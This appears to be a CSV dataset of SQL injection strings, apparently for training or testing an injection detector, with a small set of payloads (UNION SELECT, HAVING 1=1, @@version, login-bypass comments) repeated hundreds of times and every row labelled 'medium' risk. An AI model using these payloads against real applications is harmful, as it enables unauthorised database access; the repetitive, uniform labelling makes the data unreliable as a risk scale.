query,risk
' OR MD5('test') --,medium
1' OR admin' --,medium
' GROUP BY 1 --,medium
' GROUP BY 1 --,medium
"' UNION SELECT 1,2 --",medium
' OR CAST('1' as int) --,medium
' HAVING 1=1 #,medium
"' UNION SELECT 1,2 --",medium
' OR CAST('1' as int) --,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1 --,medium
' HAVING 1=1 #,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1 --,medium
1' OR admin' --,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
1' OR admin' --,medium
' HAVING 1=1,medium
' OR CAST('1' as int) --,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' OR MD5('test') --,medium
"' OR CONVERT(int, '1') --",medium
' UNION ALL SELECT 1 --,medium
' OR CAST('1' as int) --,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' AND username LIKE 'admin' --,medium
' HAVING 1=1 #,medium
' HAVING 1=1 #,medium
' OR MD5('test') --,medium
"' UNION SELECT 1,2 --",medium
' OR CAST('1' as int) --,medium
' GROUP BY 1 --,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' GROUP BY 1 --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1 --,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1,medium
' HAVING 1=1 #,medium
' HAVING 1=1,medium
"' OR CONVERT(int, '1') --",medium
' OR CAST('1' as int) --,medium
1' OR admin' --,medium
' OR MD5('test') --,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
' HAVING 1=1,medium
' UNION ALL SELECT 1 --,medium
' GROUP BY 1 --,medium
'; SELECT @@version --,medium
1' OR admin' --,medium
' AND username LIKE 'admin' --,medium
"' UNION SELECT 1,2 --",medium
' HAVING 1=1 #,medium
' UNION ALL SELECT 1 --,medium
' HAVING 1=1,medium
' GROUP BY 1 --,medium
1' OR admin' --,medium
' OR 1=1 UNION SELECT 1 --,medium
"' UNION SELECT 1,2 --",medium
'; SELECT @@version --,medium
' OR 1=1 UNION SELECT 1 --,medium
' OR CAST('1' as int) --,medium
' OR MD5('test') --,medium
"' UNION SELECT 1,2 --",medium
' LIMIT 1 /**/,medium
' LIMIT 1 /**/,medium
"' OR CONVERT(int, '1') --",medium
' AND username LIKE 'admin' --,medium
"' UNION SELECT 1,2 --",medium
' GROUP BY 1,medium
' GROUP BY 1 --,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1,medium
' HAVING 1=1,medium
' OR CAST('1' as int) --,medium
' OR CAST('1' as int) --,medium
' OR 1=1 UNION SELECT 1 --,medium
' HAVING 1=1,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' LIMIT 1 /**/,medium
' HAVING 1=1 #,medium
' GROUP BY 1,medium
1' OR admin' --,medium
' GROUP BY 1 --,medium
' OR MD5('test') --,medium
' GROUP BY 1,medium
' LIMIT 1 /**/,medium
"' UNION SELECT 1,2 --",medium
' HAVING 1=1 #,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' GROUP BY 1 --,medium
' HAVING 1=1 #,medium
' GROUP BY 1,medium
' LIMIT 1 /**/,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1,medium
' GROUP BY 1,medium
' GROUP BY 1,medium
'; SELECT @@version --,medium
' HAVING 1=1,medium
' HAVING 1=1,medium
"' OR CONVERT(int, '1') --",medium
' OR MD5('test') --,medium
1' OR admin' --,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' OR CAST('1' as int) --,medium
' GROUP BY 1,medium
' GROUP BY 1 --,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' LIMIT 1 /**/,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' HAVING 1=1 #,medium
1' OR admin' --,medium
' AND username LIKE 'admin' --,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1 --,medium
' AND username LIKE 'admin' --,medium
' GROUP BY 1 --,medium
' OR CAST('1' as int) --,medium
1' OR admin' --,medium
' HAVING 1=1,medium
' OR CAST('1' as int) --,medium
' UNION ALL SELECT 1 --,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
' OR 1=1 UNION SELECT 1 --,medium
' AND username LIKE 'admin' --,medium
' OR CAST('1' as int) --,medium
' UNION ALL SELECT 1 --,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1 --,medium
' GROUP BY 1 --,medium
' OR 1=1 UNION SELECT 1 --,medium
' OR CAST('1' as int) --,medium
' OR CAST('1' as int) --,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' LIMIT 1 /**/,medium
' LIMIT 1 /**/,medium
' OR CAST('1' as int) --,medium
' AND username LIKE 'admin' --,medium
' OR CAST('1' as int) --,medium
"' UNION SELECT 1,2 --",medium
' OR 1=1 UNION SELECT 1 --,medium
' HAVING 1=1 #,medium
' GROUP BY 1,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1,medium
' OR CAST('1' as int) --,medium
"' OR CONVERT(int, '1') --",medium
' LIMIT 1 /**/,medium
' LIMIT 1 /**/,medium
' OR 1=1 UNION SELECT 1 --,medium
' GROUP BY 1,medium
' HAVING 1=1 #,medium
' GROUP BY 1 --,medium
' GROUP BY 1 --,medium
"' OR CONVERT(int, '1') --",medium
' AND username LIKE 'admin' --,medium
' OR MD5('test') --,medium
' GROUP BY 1 --,medium
' OR CAST('1' as int) --,medium
' OR MD5('test') --,medium
'; SELECT @@version --,medium
' OR CAST('1' as int) --,medium
' UNION ALL SELECT 1 --,medium
' LIMIT 1 /**/,medium
1' OR admin' --,medium
1' OR admin' --,medium
' GROUP BY 1,medium
' GROUP BY 1 --,medium
"' UNION SELECT 1,2 --",medium
1' OR admin' --,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
' LIMIT 1 /**/,medium
' HAVING 1=1,medium
"' UNION SELECT 1,2 --",medium
1' OR admin' --,medium
' OR CAST('1' as int) --,medium
' AND username LIKE 'admin' --,medium
' OR CAST('1' as int) --,medium
' AND username LIKE 'admin' --,medium
' OR MD5('test') --,medium
' UNION ALL SELECT 1 --,medium
' GROUP BY 1,medium
' OR CAST('1' as int) --,medium
1' OR admin' --,medium
' OR 1=1 UNION SELECT 1 --,medium
' LIMIT 1 /**/,medium
' GROUP BY 1 --,medium
' HAVING 1=1,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1,medium
' OR MD5('test') --,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' HAVING 1=1,medium
"' UNION SELECT 1,2 --",medium
' LIMIT 1 /**/,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
' LIMIT 1 /**/,medium
' HAVING 1=1,medium
' LIMIT 1 /**/,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
' LIMIT 1 /**/,medium
' HAVING 1=1,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' HAVING 1=1 #,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' OR CAST('1' as int) --,medium
' OR CAST('1' as int) --,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
' GROUP BY 1 --,medium
"' OR CONVERT(int, '1') --",medium
' OR CAST('1' as int) --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1 --,medium
' GROUP BY 1,medium
' GROUP BY 1 --,medium
' LIMIT 1 /**/,medium
' GROUP BY 1,medium
' GROUP BY 1 --,medium
' HAVING 1=1 #,medium
1' OR admin' --,medium
' GROUP BY 1 --,medium
'; SELECT @@version --,medium
1' OR admin' --,medium
' OR CAST('1' as int) --,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1 --,medium
"' UNION SELECT 1,2 --",medium
"' OR CONVERT(int, '1') --",medium
' LIMIT 1 /**/,medium
' LIMIT 1 /**/,medium
' HAVING 1=1 #,medium
' OR 1=1 UNION SELECT 1 --,medium
' GROUP BY 1 --,medium
' LIMIT 1 /**/,medium
' GROUP BY 1 --,medium
' OR MD5('test') --,medium
' GROUP BY 1 --,medium
' AND username LIKE 'admin' --,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' HAVING 1=1 #,medium
"' OR CONVERT(int, '1') --",medium
"' OR CONVERT(int, '1') --",medium
1' OR admin' --,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
1' OR admin' --,medium
' HAVING 1=1,medium
' OR 1=1 UNION SELECT 1 --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1 --,medium
' HAVING 1=1 #,medium
' LIMIT 1 /**/,medium
' OR CAST('1' as int) --,medium
' UNION ALL SELECT 1 --,medium
' AND username LIKE 'admin' --,medium
' UNION ALL SELECT 1 --,medium
' OR 1=1 UNION SELECT 1 --,medium
1' OR admin' --,medium
' UNION ALL SELECT 1 --,medium
1' OR admin' --,medium
1' OR admin' --,medium
' OR MD5('test') --,medium
' GROUP BY 1 --,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
' OR MD5('test') --,medium
' LIMIT 1 /**/,medium
' GROUP BY 1,medium
' GROUP BY 1,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1 --,medium
' GROUP BY 1,medium
' GROUP BY 1 --,medium
' HAVING 1=1,medium
' HAVING 1=1 #,medium
' GROUP BY 1,medium
' LIMIT 1 /**/,medium
' GROUP BY 1,medium
' AND username LIKE 'admin' --,medium
' HAVING 1=1,medium
' LIMIT 1 /**/,medium
"' OR CONVERT(int, '1') --",medium
' OR MD5('test') --,medium
' HAVING 1=1 #,medium
' LIMIT 1 /**/,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1 --,medium
' GROUP BY 1,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1 #,medium
'; SELECT @@version --,medium
' GROUP BY 1,medium
1' OR admin' --,medium
' OR CAST('1' as int) --,medium
"' OR CONVERT(int, '1') --",medium
1' OR admin' --,medium
' GROUP BY 1 --,medium
' GROUP BY 1,medium
' GROUP BY 1,medium
1' OR admin' --,medium
' GROUP BY 1,medium
' LIMIT 1 /**/,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1,medium
' OR MD5('test') --,medium
' GROUP BY 1,medium
' OR MD5('test') --,medium
"' OR CONVERT(int, '1') --",medium
' LIMIT 1 /**/,medium
' HAVING 1=1,medium
' HAVING 1=1 #,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
' HAVING 1=1 #,medium
' LIMIT 1 /**/,medium
' GROUP BY 1 --,medium
' AND username LIKE 'admin' --,medium
' HAVING 1=1 #,medium
' HAVING 1=1,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1,medium
1' OR admin' --,medium
' UNION ALL SELECT 1 --,medium
"' UNION SELECT 1,2 --",medium
' OR MD5('test') --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
'; SELECT @@version --,medium
' GROUP BY 1,medium
' AND username LIKE 'admin' --,medium
' OR MD5('test') --,medium
' GROUP BY 1,medium
' AND username LIKE 'admin' --,medium
' HAVING 1=1,medium
' HAVING 1=1 #,medium
' HAVING 1=1 #,medium
' OR 1=1 UNION SELECT 1 --,medium
' HAVING 1=1 #,medium
' GROUP BY 1,medium
' GROUP BY 1,medium
' AND username LIKE 'admin' --,medium
' HAVING 1=1 #,medium
' HAVING 1=1,medium
' AND username LIKE 'admin' --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1,medium
' HAVING 1=1 #,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
' OR MD5('test') --,medium
1' OR admin' --,medium
' GROUP BY 1,medium
' LIMIT 1 /**/,medium
' HAVING 1=1,medium
' HAVING 1=1,medium
' GROUP BY 1 --,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
"' UNION SELECT 1,2 --",medium
' LIMIT 1 /**/,medium
' HAVING 1=1,medium
' GROUP BY 1 --,medium
' GROUP BY 1,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1,medium
' OR MD5('test') --,medium
' OR CAST('1' as int) --,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' LIMIT 1 /**/,medium
1' OR admin' --,medium
"' UNION SELECT 1,2 --",medium
' GROUP BY 1,medium
"' UNION SELECT 1,2 --",medium
' HAVING 1=1,medium
'; SELECT @@version --,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' OR MD5('test') --,medium
' LIMIT 1 /**/,medium
' OR MD5('test') --,medium
' GROUP BY 1,medium
'; SELECT @@version --,medium
' UNION ALL SELECT 1 --,medium
' OR CAST('1' as int) --,medium
' OR CAST('1' as int) --,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1 --,medium
"' UNION SELECT 1,2 --",medium
'; SELECT @@version --,medium
' HAVING 1=1,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1 #,medium
' GROUP BY 1 --,medium
' UNION ALL SELECT 1 --,medium
' GROUP BY 1 --,medium
' OR MD5('test') --,medium
"' OR CONVERT(int, '1') --",medium
' OR CAST('1' as int) --,medium
' LIMIT 1 /**/,medium
' LIMIT 1 /**/,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
' GROUP BY 1 --,medium
' LIMIT 1 /**/,medium
' HAVING 1=1,medium
' LIMIT 1 /**/,medium
' OR CAST('1' as int) --,medium
' OR CAST('1' as int) --,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1 #,medium
' HAVING 1=1 #,medium
' GROUP BY 1,medium
"' OR CONVERT(int, '1') --",medium
' OR MD5('test') --,medium
'; SELECT @@version --,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1,medium
'; SELECT @@version --,medium
'; SELECT @@version --,medium
' OR MD5('test') --,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1,medium
' GROUP BY 1,medium
' OR MD5('test') --,medium
' UNION ALL SELECT 1 --,medium
' AND username LIKE 'admin' --,medium
1' OR admin' --,medium
' OR CAST('1' as int) --,medium
' OR MD5('test') --,medium
' OR CAST('1' as int) --,medium
'; SELECT @@version --,medium
' OR CAST('1' as int) --,medium
'; SELECT @@version --,medium
1' OR admin' --,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
' OR CAST('1' as int) --,medium
' OR CAST('1' as int) --,medium
"' OR CONVERT(int, '1') --",medium
' LIMIT 1 /**/,medium
' HAVING 1=1 #,medium
' LIMIT 1 /**/,medium
"' UNION SELECT 1,2 --",medium
' OR MD5('test') --,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' HAVING 1=1 #,medium
' HAVING 1=1 #,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
1' OR admin' --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1,medium
' OR MD5('test') --,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1 --,medium
' OR MD5('test') --,medium
' GROUP BY 1,medium
"' UNION SELECT 1,2 --",medium
' LIMIT 1 /**/,medium
"' OR CONVERT(int, '1') --",medium
"' OR CONVERT(int, '1') --",medium
"' UNION SELECT 1,2 --",medium
' GROUP BY 1,medium
' GROUP BY 1,medium
1' OR admin' --,medium
' OR CAST('1' as int) --,medium
'; SELECT @@version --,medium
' UNION ALL SELECT 1 --,medium
' UNION ALL SELECT 1 --,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
' OR MD5('test') --,medium
' OR MD5('test') --,medium
"' OR CONVERT(int, '1') --",medium
"' UNION SELECT 1,2 --",medium
' HAVING 1=1,medium
' GROUP BY 1,medium
' UNION ALL SELECT 1 --,medium
' GROUP BY 1 --,medium
"' UNION SELECT 1,2 --",medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1 #,medium
' OR MD5('test') --,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' AND username LIKE 'admin' --,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
' OR MD5('test') --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1 --,medium
' GROUP BY 1,medium
' OR 1=1 UNION SELECT 1 --,medium
"' OR CONVERT(int, '1') --",medium
' LIMIT 1 /**/,medium
' GROUP BY 1,medium
' GROUP BY 1,medium
' GROUP BY 1 --,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1,medium
' UNION ALL SELECT 1 --,medium
' HAVING 1=1,medium
' OR 1=1 UNION SELECT 1 --,medium
' GROUP BY 1,medium
1' OR admin' --,medium
1' OR admin' --,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
"' UNION SELECT 1,2 --",medium
"' OR CONVERT(int, '1') --",medium
' OR MD5('test') --,medium
' OR CAST('1' as int) --,medium
' HAVING 1=1,medium
1' OR admin' --,medium
' HAVING 1=1 #,medium
' LIMIT 1 /**/,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1,medium
' OR MD5('test') --,medium
1' OR admin' --,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
' GROUP BY 1,medium
1' OR admin' --,medium
' OR CAST('1' as int) --,medium
"' OR CONVERT(int, '1') --",medium
' GROUP BY 1,medium
' GROUP BY 1,medium
' UNION ALL SELECT 1 --,medium
' HAVING 1=1,medium
' OR CAST('1' as int) --,medium
1' OR admin' --,medium
' HAVING 1=1,medium
"' OR CONVERT(int, '1') --",medium
' HAVING 1=1 #,medium
' OR MD5('test') --,medium
' HAVING 1=1,medium
' GROUP BY 1 --,medium
' LIMIT 1 /**/,medium
' LIMIT 1 /**/,medium
' OR CAST('1' as int) --,medium
' GROUP BY 1,medium
'; SELECT @@version --,medium
' HAVING 1=1 #,medium
' GROUP BY 1,medium
' HAVING 1=1,medium
' GROUP BY 1 --,medium
"' UNION SELECT 1,2 --",medium
' OR MD5('test') --,medium
' GROUP BY 1,medium
1' OR admin' --,medium
"' UNION SELECT 1,2 --",medium
' HAVING 1=1,medium
' GROUP BY 1 --,medium
' GROUP BY 1 --,medium
' HAVING 1=1,medium
' HAVING 1=1 #,medium
' LIMIT 1 /**/,medium
